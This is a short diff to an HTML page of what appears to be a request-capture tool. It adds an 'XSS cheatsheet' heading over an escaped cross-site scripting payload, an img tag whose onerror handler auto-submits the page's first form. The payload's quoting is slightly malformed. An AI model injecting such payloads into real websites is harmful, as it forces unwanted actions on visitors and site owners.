@@ -22,6 +22,8 @@ th,td{padding:8px;border:1px solid #ddd;text-align:left}
 <h2>Sample payload</h2>
 <p class="small">Use the returned URL from register as the endpoint. Example:</p>
 <pre class="code">fetch('https://example.com', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: 'value' }) });</pre>
+
+<h2>XSS cheatsheet</h2>
 <pre class="code">&lt;img src=x" onerror="document.forms[0].submit()&gt;</pre>
   
 <h2>Recent submissions / captured requests</h2>
